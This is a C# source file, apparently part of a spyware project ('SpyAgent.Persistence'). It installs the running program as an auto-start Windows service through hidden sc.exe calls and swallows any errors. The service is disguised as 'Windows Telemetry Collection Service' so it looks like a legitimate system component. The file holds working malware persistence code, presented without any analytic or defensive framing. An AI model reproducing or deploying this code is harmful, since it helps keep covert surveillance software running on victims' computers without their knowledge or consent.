namespace SpyAgent.Persistence;

using System.Diagnostics;

internal static class ServiceInstaller
{
    private const string ServiceName = "WindowsTelemetryService";
    private const string DisplayName = "Windows Telemetry Collection Service";

    public static void Install()
    {
        var exePath = Environment.ProcessPath ?? "";
        if (string.IsNullOrEmpty(exePath)) return;

        var args = $"create \"{ServiceName}\" binPath= \"\\\"{exePath}\\\" --service\" " +
                   $"DisplayName= \"{DisplayName}\" start= auto";

        RunSc(args);
        RunSc($"start \"{ServiceName}\"");
    }

    public static void Uninstall()
    {
        RunSc($"stop \"{ServiceName}\"");
        RunSc($"delete \"{ServiceName}\"");
    }

    public static bool IsInstalled()
    {
        var output = RunScWithOutput($"query \"{ServiceName}\"");
        return output.Contains("RUNNING") || output.Contains("STOPPED");
    }

    private static void RunSc(string arguments)
    {
        try
        {
            var process = Process.Start(new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            });
            process?.WaitForExit(10000);
        }
        catch { }
    }

    private static string RunScWithOutput(string arguments)
    {
        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = arguments,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                }
            };
            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit(5000);
            return output;
        }
        catch
        {
            return "";
        }
    }
}
